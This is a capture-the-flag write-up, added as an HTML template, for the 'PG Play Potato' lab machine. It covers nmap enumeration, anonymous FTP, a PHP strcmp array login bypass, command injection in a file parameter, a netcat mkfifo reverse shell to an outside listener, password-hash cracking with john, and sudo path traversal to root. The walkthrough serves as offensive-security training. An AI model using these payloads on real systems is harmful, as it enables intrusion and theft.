@@ -1,0 +1,173 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play Potato</h1>
+    <p class="text">Difficulty : Easy | Community Rating : Intermediate</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=2000</u>
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
+|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
+|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
+80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Potato company
+2112/tcp  open     ftp     ProFTPD
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
+|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
+8736/tcp  filtered unknown
+8851/tcp  filtered unknown
+62042/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">HTTP and ftp is open. And ftp allows anonymous login. Also it holds two share we can access.</p>
+<div class="code-box"><pre><code>└─$ ftp $IP -p 2112</code></pre></div>
+<p class="text">Login with with user : anonymous and passwrod : anonymous, and I got two files. One of the file welcome.msg doesn't include interesting information, but second one is php code for login page. I'll come back to this file after observing what does HTTP page display.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/potato/1.png' %}" alt="">
+    <p class="text">There is no interesting information. I'll enumerate directory with gobuster.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP -t 50</u>
+===============================================================
+/.htaccess            (Status: 403) [Size: 280]
+/.hta                 (Status: 403) [Size: 280]
+/.htpasswd            (Status: 403) [Size: 280]
+/admin                (Status: 301) [Size: 318] [--&gt; http://192.168.239.101/admin/]
+/index.php            (Status: 200) [Size: 245]
+/server-status        (Status: 403) [Size: 280]
+
+===============================================================</code></pre></div>
+
+<p class="text">There is admin page.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/potato/2.png' %}" alt="">
+    <p class="text">I tried SQL injection command, but it wasn't successful. So, let's back to the php file we installed before.</p>
+</div>
+
+
+<h2 class="subtitle">Foothold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/potato/3.png' %}" alt="">
+    <p class="text">The line 10 shows us vulnerable code. The code <u>strcmp($_POST['password'], $pass) == 0)</u> is actually attackable because if we provide array for password parameter, php code evaluate it like <u>strcmp(array(), "some_password") = NULL</u>. Then, we can bypass this string check.</p>
+</div>
+
+
+<p class="text">Launch burpsuite and change the parameter 'password' into 'password[]'. </p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/potato/4.png' %}" alt="">
+    <img src="{% static 'EthHack/images/potato/5.png' %}" alt="">
+</div>
+
+<p class="text">Then, we got url navigates us to dashboard.</p>
+
+<p class="text">On the dashboard, I found file parsing function on the Logs page.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/potato/6.png' %}" alt="">
+    <img src="{% static 'EthHack/images/potato/7.png' %}" alt="">
+</div>
+
+<p class="text">Again, I stopped the get request, and changed file parameter into <u>file=log_01.txt;ls</u> for command injection test, and it successfully listed current directory files. Using this, we can get reverse shell.</p>
+<div class="code-box"><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.205 4444 >/tmp/f</code></pre></div>
+<p class="text">I encoded above code into url encode with burpsute, and launched nc -lvpn 4444. </p>
+<div class="img">
+    <img src="{% static 'EthHack/images/potato/8.png' %}" alt="">
+    <p class="text">Then, I added the encoded reverse shell code after <u>file=log_01.txt;</u>.</p>
+</div>
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.214] from (UNKNOWN) [192.168.141.101] 37200
+sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></div>
+
+<p class="text">I got reverse shell with www-data.</p>
+
+<h2 class="subtitle">Lateral Movement</h2>
+<div class="code-box"><pre><code>$ cat /etc/passwd
+florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+proftpd:x:112:65534::/run/proftpd:/usr/sbin/nologin
+ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin
+<u>webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/</u>:1001:1001:webadmin,,,:/home/webadmin:/bin/bash</code></pre></div>
+
+<p class="text">Unrealistically, there was a password hash for webadmin in /etc/passwd file. Let's decode it and change user into webadmin.</p>
+
+<div class="code-box"><pre><code>└─$ echo 'webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/' > hash
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+webadmin:dragon</code></pre></div>
+
+<div class="code-box"><pre><code>$ su webadmin
+Password: dragon
+id
+uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)</code></pre></div>
+
+
+<p class="text">We got webadmin user.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">For stable connection, I created .ssh directory under the webadmin home, and created file 'authorized_keys'. Then, pasted my public key to the file.</p>
+
+<div class="code-box"><pre><code>└─$ ssh -i ~/.ssh/id_rsa webadmin@$IP</code>
+...
+webadmin@serv:/notes$ </pre></div>
+<p class="text">After creating ssh connection, I checked sudo list for the user webadmin.</p>
+
+<div class="code-box"><pre><code>webadmin@serv:~$ sudo -l
+Matching Defaults entries for webadmin on serv:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webadmin may run the following commands on serv:
+    (ALL : ALL) /bin/nice /notes/*</code></pre></div>
+    <p class="text">Also, I runed this command for test.</p>
+
+    <div class="code-box"><pre><code>webadmin@serv:~$ cd /notes
+webadmin@serv:/notes$ ls -la
+total 16
+drwxr-xr-x  2 root root 4096 Aug  2  2020 .
+drwxr-xr-x 21 root root 4096 Sep 28  2020 ..
+-rwx------  1 root root   11 Aug  2  2020 clear.sh
+-rwx------  1 root root    8 Aug  2  2020 id.sh
+webadmin@serv:/notes$ sudo /bin/nice /notes/id.sh
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+<p class="text">We can run shell file as root.</p>
+
+    <p class="text">Observing the command we can run as root, we can run command /bin/nice /notes/*, which we can run arbitrary file because * allows us to use path traversal technique like '/notes/../../../tmp/rev.sh'.</p>
+
+<p class="text">Therefore, I created bash generating file named rev.sh, and ran it with sudo.</p>
+
+<div class="code-box"><pre><code>webadmin@serv:/notes$ nano /tmp/bash.sh
+<u class="green">#!/bin/bash
+bash</u>
+webadmin@serv:/notes$ chmod +x /tmp/bash.sh</code></pre></div>
+
+<p class="text">Then run it.</p>
+
+<div class="code-box"><pre><code>webadmin@serv:/tmp$ sudo /bin/nice /notes/../../../../tmp/bash.sh
+root@serv:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+
+<p class="text">I got root user. You can find proof flag on /root/proof.txt.</p>
+
+
+</body>
+</html>
